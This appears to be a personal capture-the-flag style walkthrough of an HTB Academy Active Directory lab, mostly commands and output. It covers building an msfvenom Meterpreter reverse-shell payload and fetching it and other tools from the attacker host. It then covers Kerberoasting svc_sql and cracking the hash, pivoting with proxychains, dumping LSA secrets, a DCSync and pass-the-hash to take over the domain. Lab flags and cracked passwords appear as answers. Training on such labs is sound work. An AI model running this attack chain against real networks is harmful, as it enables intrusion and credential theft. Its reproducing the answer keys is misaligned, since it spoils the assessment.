


### Enumeration

#### NMAP

#### Port 80

Upload page
![[Pasted image 20260511180511.png]]



#### Question 2: Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer

Answer:
```go

```


```go

nmap -Pn -A -p 80,443,445,135,139 10.129.202.242
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-12 17:13 -0400
Nmap scan report for 10.129.202.242
Host is up (0.019s latency).

PORT    STATE  SERVICE       VERSION
80/tcp  open   http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
135/tcp open   msrpc         Microsoft Windows RPC
139/tcp open   netbios-ssn   Microsoft Windows netbios-ssn
443/tcp closed https
445/tcp open   microsoft-ds?
Device type: general purpose
Running: Microsoft Windows 2019
OS CPE: cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2019
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-05-12T21:14:07
|_  start_date: N/A

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   16.43 ms 10.10.14.1
2   16.61 ms 10.129.202.242

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.35 seconds
```


##### Create ms4venom payload
```go
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=9000 -e x86/shikata_ga_nai -i 3 -a x86 -f exe > encoded.exe
```

```go
msfconsole
```

```go
use exploit/multi/handler
```

```go
set payload windows/meterpreter/reverse_tcp
```

```go
set lhost 10.10.14.2
```

```go
set lport 9000
```

```go
exploit
```

![[Pasted image 20260513211926.png]]

Serve the encoded.exe payload
```go
python3 -m http.server 7777
```

Now send the file to the target and execute via the file upload page
```go
curl http://10.10.14.2:7777/encoded.exe -O C:\Windows\System32\encoded.exe
```

>[!warning] HOST IP CHANGE
```go
curl http://10.10.17.68:7777/encoded.exe -O C:\Windows\System32\encoded.exe
```

```go
curl http://10.10.14.190:8888/encoded.exe -O C:\encoded.exe
```

```go
C:\Windows\System32\encoded.exe
```

Meterpreter session obtained and dropped into shell with the `shell` command
![[Pasted image 20260513212517.png]]

Identifying the user/account for SPN for SQL01.inlanefreight.local:1433. The account to use is `svc_sql`
![[Pasted image 20260513215725.png]]



#### Question 3:  Crack the account's password. Submit the cleartext value.

Answer:
```go
lucky7
```


To run powershell commands in meterpreter:
```go
powershell
```

Run the following to target the SPN of the user `svc_sql`:
```go
Add-Type -AssemblyName System.IdentityModel
```

Load their ticket in memory
```go
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/SQL01.inlanefreight.local:1433"
```

results:
![[Pasted image 20260513221710.png]]

Copy mimikatz to target
```go
curl http://10.10.14.2:7777/mimikatz.exe -O C:\Windows\System32\mimikatz.exe
```

![[Pasted image 20260513225012.png]]

![[Pasted image 20260513224929.png]]


Store in the file "encoded_file"
```go
doIF0DCCBcygAwIBBaEDAgEWooIEwTCCBL1hggS5MIIEtaADAgEFoRUbE0lOTEFO
RUZSRUlHSFQuTE9DQUyiNTAzoAMCAQKhLDAqGwhNU1NRTFN2YxseU1FMMDEuaW5s
YW5lZnJlaWdodC5sb2NhbDoxNDMzo4IEXjCCBFqgAwIBF6EDAgECooIETASCBEgk
E1RYbUAwGJMUgW+PV98j2uUjmvxh41OYKLS9FwA0bo8gGY9zhc1C8f2h+HXKq67y
ithbocRc7zscm0KsUkaBZH2QNozPDS3PJ3c1M3UQFxtK4Vi6oZ4d+ifYEpD2jUwf
MeyGJf5Tk+jDrubhBvCA0Xwp18f+IxOavKazS23TaxSPxrtFHDPA0p4l6904kvC4
4iUdKCJjaHQrrtRbaKTQrQi36hgXsaPQzSlpvTqmMAiD9ItHVqe/6QgrJ09jA3wk
VVsdTboDH1UTam6uIlC6fhZ6+ma/9A6owxWX264N/Sh67w+INCL57tfogoKE0Wqr
O7OzttKnQ5wrRTt+J7XK2cDmWpwdBsB/kUsLoK7hxBg4bL4AnTbkH3KzHIYzfGv1
YuRbEvdEv7rM3rmUzTAMAaKZWe0eVlEEiQ/cn8VfgkN4BUi03NMoXki7ZfeqMB5a
D8S7ox9vfcqIMeJC5PHpA5fGgFCZGm3f2rJnBbHTjd2uePacv0WVuRArb4uW6tkn
wbzVwk79J3yKREv+cnO4H4wAPDtmvT1MoSkmTSZaZjelA7rZXgcffXeDYqNV8p/0
8dyp9A9kMx4jdlxWpxR3jUzyvQmsKdR/8hTHFp8lQOumXy6menMZSMZLyD17XBM7
tmFu3qdzyKHwuiW+gjqQ+52ugj6WaWKsQFFnCzx6uo4zvoNuinMhZN58utT0mxQ4
nRehLMtZFVLeTGQeV2Q7UtzSWcYxFUGLOc11HcqrJQoOc7qaLGIzy6LToSiPFiwG
lP/E7PY4tT4lue8rDhCQGQAixobhdE8tKmqxwZD5Do34BuhgUofMrYQJ/lVNsB49
7HvROFMu7R7aFwOtWGbZZu/5c9xAE/p2eqKPyuzzW6kbwhe6mW6JKyKRgtVen2Io
qmUdpoqzDyiUujpouwndRnqobPWQwuzsnWC1mfIjOnNZbjQtbfhS8MkzMOkUwy7c
IPBYsE3HVh3Qm8ZNUyELsgW+g4nkYQ2w6e/b1T0gHqfbL9J7GgeKQp2S2AJiSiLB
DDs5teiXx6MXCymUJQd5+4+VfF/56zUo7ppzOJYV/ZqU0/VZl90oNg/S8pbK/l6+
9466de/o4pejlukV04XAz1Wkx1wr7ws/oETvGB6N3JraQEIQaa9jnUXVgZRN/qTi
L40BQ0xW/R9G+DY9dBzwSSLDRnwQZ3XCv8z9lAUZfDVW1grxSvbn+2E4lJQV3/5a
G51AWfloz0RNQmVEDvfzct2KQOpwgm8CqSA6QrhccT17NVtU59u5MlC3JOgta/DF
f87w4L5ZLaDbjbM+8hqqIhYGDL1HvT15BdWXr87xtV5z21RmPjVFIdOqzvfNNJzx
ZRob0SqUdFMRHRpC4gO1BEUJB0nGol3MRBUbWNBDaubz7i8HZzTFXDgvl2QdCohN
lrE7wnqk6AB7uwA0zm9cyp0P3X+X5AZdBpr1iio9sFLSWFjWiNBEo4H6MIH3oAMC
AQCige8Egex9gekwgeaggeMwgeAwgd2gGzAZoAMCARehEgQQRJ+nSyr8rRM5SChj
mRDUrqEVGxNJTkxBTkVGUkVJR0hULkxPQ0FMohcwFaADAgEBoQ4wDBsKV0VCLVdJ
TjAxJKMHAwUAQKEAAKURGA8yMDI2MDUxNDAyMTA1N1qmERgPMjAyNjA1MTQxMTEz
MzVapxEYDzIwMjYwNTIxMDExMzM1WqgVGxNJTkxBTkVGUkVJR0hULkxPQ0FMqTUw
M6ADAgECoSwwKhsITVNTUUxTdmMbHlNRTDAxLmlubGFuZWZyZWlnaHQubG9jYWw6
MTQzMw==
```

Convert to kirbi file
```go
cat encoded_file | base64 -d > svc_sql.kirbi
```

Extract the K ticket
```go
python3 /usr/share/john/kirbi2john.py vmware.kirbi
```

It will produce the following. Store in a file called "cracked_file"
```go
$krb5tgs$23$*vmware*$813149fb261549a6a1b4965ed49d1ba8$7a8c91b47c534bc258d5c97acf433841b2ef2478b425865dc75c39b1dce7f50dedcc29fc8a97aef8d51a22c5720ee614fcb646e28d854bcdc2c8b362bbfaf62dcd9933c55efeba9d77e4c6c6f524afee5c68dacfcb6607291a20cdfb0ef144055356a7296e33b440754be7f87754ac2e4858348e2aebb7270b2d345047f880e17acc07e27a8f752c372bc83a62d54208d12288893d32afd210191dd3b2c56797bd1a72e35a73a7820be51fbf277b83d8181fff5a05cf21481a7b462ceb01c3761c50952689ed1099827c17c2934131db71bc5142c589cd70ed2ebf57dca3f6226f3b21849529355414433210b8d7bd76fec4eb68a45deebc3e7cc931ed8769328536769123f5040d6771915cdbc6c90164669fac72d23a631fef25804b5c8ec39680a4cc2959929edce34bbee6aff135bcbbb26a41a4b4e88b936896d4662ac849f56d7d68071be139cf4dfaf66497015297f9b44cdaef096c8d00255ec3e62f7105d905d0b2f39cef83db4d812718f95e8c99129f3207b386b4c32f7d57befd411e19c218148d19028eb0103d6be99ae23a454f6f3b0339d00d27879f342598937596cadad068ac3d815952a053f87d87b2584784b9d83050eea9a7c6474cde26c90f4a3546076a40ed374d004c465f654623499ca14e9c11538012cf00dee315e2ed444293822502d7f685022e61f3568e1db25b5cfe5a89b33878b6e3db05e9d91ad63820fcb7d0449e66add13f1efceddda95339db3dc919f1caff9690e54b3e4f9a8cf6998a9f9bf55c7a2ed2c87382e9da60f7ca3c22e08cc359f3ef6f4603a5af2fc28303bf3602ab9bc52026e58c27fb247fd4210f45244fd71484685b837fe9573a53964d54acfde7f963028764e99bea7b77139cb651328e862e43d894638288eace99b6d4f8b6684150db9adc43254143b77f32ebe6fbe309dde3b78305fdf0fe60505f9000b89c67c75ef6dd425e04fbe3a5ebf2d78a11a392d815a29ef48d9457fb6c780eb4cc07dfa68c2e97054788952f5ad92ca8d062e4a68967860302fd9630174af832e599bb5fca9cf341d7a1176868d9073796dffbd48efe99b222f4274e93066de646b3c60d1dd94072dd121dd0706024d11738a75ebeb5b7865a5505220d0f03aea6d359a17f3c5b6424989b31b6e52d1c558393aa34e81204fb107374a8884dcb16f6c59a76a0022004fd921734b8719e8694ba0d7f87eb46f5607af4eb1c681b6b5140dbc94a9ea7f5db6ae4c71fbc1024a25b77ac00bdc549d66373d390643be8f1007930a4124e99d4fcb6177dbd5669fb06170d3b8a75db9928164b55e454d08e77f917b1dd2e648d9c7eb0cb2b8ca0eff8a44d1ea5fdd67e01da79047a4a1406f761f5e3b6944cebed45379ea14e7a027c843fa405c07c8385a2102f07967a7cb4883f44ee72d4aa7a38b2701e77374016a01193f5b178e34f4cf2d8eadf651e162569eb421c74e8d5e0cc1a9fab58a4b9b63babb09efc3427e1667f9c7731bcabe3645986040a7306924df5e6e68655e7b0e2e88e7ce0281e0f554de82d9de6c4d9c8d2a36fce65bbb337a415030ce1d03c00fd9783afb5df0ee8fbabfa358521ad845e6d07fde7d34f2311ebae6e6a119d60d899467a66f997c273d2df73350f2d6c5438e71a057feeab
```

Modify the cracked file to be used with hashcat
```go
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' cracked_file > svc_sql_hashcat
```

Crack file with hashcat
```go
hashcat -m 13100 svc_sql_hashcat /usr/share/wordlists/rockyou.txt
```

--------------------------------------------------


Move PowerView to the target
```go
curl http://10.10.14.2:7777/PowerView.ps1 -O C:\PowerView.ps1
```

Import the module
```go
Import-Module .\PowerView.ps1
```

Target the svc_sql user
```go
Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat
```

![[Pasted image 20260514061200.png]]

Export all tickets
```go
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

Cat the CSV file. It will display all the users and their tickets. This will make it easier to copy the svc_sql's ticket into a separate file.
```go
cat .\lfreight_tgs.csv
```

Crack the hash
```go
hashcat -m 13100 svc_sql_hashcat /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20260514062116.png]]

#### Question 4: Submit the contents of the flag.txt file on the Administrator desktop on MS01

Answer:
```go
spn$_r0ast1ng_on_@n_0p3n_f1re
```

I've tried enumerating the host WEB-WIN01, however, I was not able to gather any more information.


The host WEB-WIN01 is running on the 172.16.6.100 network. I can use this host as the pivot point to scan the other targets on the network for MS01.

![[Pasted image 20260515161108.png]]


First configure SOCKS Proxy to start a listener on port 1080 and route all traffic via the meterpreter session. Do this in a separate window

>[!info] What does this do?
> This will route my command traffic via proxychains on port 1080


```go
msfconsole
```

```go
use auxiliary/server/socks_proxy
```

```go
set version 5
```

```go
run
```

>[!warning] Enter `show options` to ensure the SRVHOST and SRVHOST is 0.0.0.0 and the SRVPORT is 1080.
> Also ensure you're using socks5 in `/etc/proxychains` as this corresponds to the port 1080



>[!Important] NOW SWITCH TO THE WEB01 METERPRETER SESSION!

Add a route to reach the 172.6.6.0/24 network. Reference the following ![[HTB-Academy/12-Pivoting Tunneling and Port Forwarding/Meterpreter Tunneling & Port Forwarding#^95727f]]

![[Pasted image 20260515174239.png]]

```go
run autoroute -s 172.16.6.0/24
```

OR

```go
 use post/multi/manage/autoroute
```

```go
set SESSION 1
```

```go
set SUBNET 172.16.6.0/24
```

```go
run
```

Confirmed the route has been added and now I have access to it. In the same window, be the autoroute session and run the port scan inside it.
```go
use auxiliary/scanner/portscan/tcp
```

```go
show options
```

```go
set RHOSTS 172.16.6.0/24
```

```go
set PORTS 139,445
```

```go
set THREADS 50
```

```go
run
```

We see the IP 172.16.6.3 and 50 have ports 139 and 445 open. I will use 172.16.6.3 since it's the first one that appeared

![[Pasted image 20260522072114.png]]
Use proxychains with nmap to scan the network
```go
proxychains nmap -sN --min-rate 10 -Pn 172.16.6.3 -p 139,445
```

```go
sudo proxychains crackmapexec smb 172.16.6.3 -u svc_sql -p lucky7 -x "type C:\users\administrator\desktop\flag.txt"
```


#### Question 5:  Find cleartext credentials for another domain user. Submit the username as your answer.


Use crackmapexec to dump secrets from lsa
```go
sudo proxychains crackmapexec smb 172.16.6.3 -u svc_sql -p lucky7 --lsa
```

Answer
```go
tpetty
```

#### Question 6: 

```go
sudo proxychains crackmapexec smb 172.16.6.3 -u svc_sql -p lucky7 --lsa
```

Answer
```go
Sup3rS3cur3D0m@inU2eR
```

#### Question 7: What attack can this user perform?

```go
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=9000 -e x86/shikata_ga_nai -i 3 -a x86 -f exe > encoded.exe
```

```go
curl http://10.10.16.3:4444/encoded.exe -O C:\encoded.exe
```

```go
C:\encoded.exe
```

```go
curl http://10.10.16.3:4444/PowerView.ps1 -O C:\PowerView.ps1
```

```go
$tpettysid = Convert-NameToSid tpetty
```

```go
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $tpettysid} -Verbose
```

![[Pasted image 20260524000208.png]]

Answer:
```go
DCSYNC
```

#### Question 8: Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01

```go
curl http://10.10.16.3:4444/Rubeus.exe -O C:\Rubeus.exe
```

Do the same for PowerView
```go
curl http://10.10.16.3:4444/PowerView.ps1 -O C:\PowerView.ps1
```

Find admin accounts to Kerberoast
```go
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

Can't Kerberoast any users
![[Pasted image 20260524101331.png]]

>[!Important] THE ATTACK TECH TO USE IS DCSYNC!!!!
> The user `tpetty` can perform DCSYNC!


#### Send mimikatz.exe to the target WEB01
```go
curl http://10.10.16.3:4444/mimikatz.exe -O C:\mimikatz.exe
```

To execute DCSYNC via MImikatz, I must be in the context of the user tpetty
```go
runas /netonly /user:INLANEFREIGHT\tpetty "powershell"
```

>[!error] None of this worked. You will have to proxy all your attacks via proxychains

Use tpetty to perform the dcsync against the admin account to get their hash

#### Get the admin's hash
```go
proxychains sudo secretsdump.py INLANEFREIGHT/tpetty@172.16.6.3 -just-dc-user administrator
```

To get the flag, use [[Pass the Hash]] technique to get it
```go
evil-winrm -i 172.16.6.3 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0
```

Answer:
```go
r3plicat1on_m@st3r!
```
